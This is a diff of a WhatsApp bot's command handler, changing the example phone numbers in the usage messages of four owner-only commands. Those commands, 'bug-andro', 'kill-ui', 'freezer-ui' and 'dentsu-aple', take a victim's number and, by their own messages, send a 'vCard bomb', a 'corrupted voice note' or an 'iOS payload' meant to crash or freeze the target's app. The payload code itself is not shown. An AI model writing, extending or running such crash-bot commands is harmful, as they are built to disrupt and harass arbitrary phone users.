@@ -1401,7 +1401,7 @@ async function handleCommand(ctx) {
 
   case 'bug-andro': {
     if (!isOwner) return reply('❌ Owner only.');
-    if (!text) return reply('❌ Usage: .bug-andro 224624977006');
+    if (!text) return reply('❌ Usage: .bug-andro 242053323191');
     const bugNum = text.replace(/[^0-9]/g, '');
     const bugTarget = bugNum + '@s.whatsapp.net';
     await reply('⚡ Sending Android vCard bomb...');
@@ -1427,7 +1427,7 @@ async function handleCommand(ctx) {
 
   case 'kill-ui': {
     if (!isOwner) return reply('❌ Owner only.');
-    if (!text) return reply('❌ Usage: .kill-ui 242065121108');
+    if (!text) return reply('❌ Usage: .kill-ui 242053323191');
     const killNum = text.replace(/[^0-9]/g, '');
     const killTarget = killNum + '@s.whatsapp.net';
     await reply('⚡ Sending corrupted voice note...');
@@ -1472,7 +1472,7 @@ async function handleCommand(ctx) {
 
   case 'freezer-ui': {
     if (!isOwner) return reply('❌ Owner only.');
-    if (!text) return reply('❌ Usage: .freezer-ui 242065121108');
+    if (!text) return reply('❌ Usage: .freezer-ui 242053323191');
     const freezeNum = text.replace(/[^0-9]/g, '');
     const freezeTarget = freezeNum + '@s.whatsapp.net';
     await reply('⚡ Sending mega vCard...');
@@ -1495,7 +1495,7 @@ async function handleCommand(ctx) {
 
   case 'dentsu-aple': {
     if (!isOwner) return reply('❌ Owner only.');
-    if (!text) return reply('❌ Usage: .dentsu-aple 242065121108');
+    if (!text) return reply('❌ Usage: .dentsu-aple 242053323191');
     const appleNum = text.replace(/[^0-9]/g, '');
     const appleTarget = appleNum + '@s.whatsapp.net';
     await reply('⚡ Sending iOS payload...');
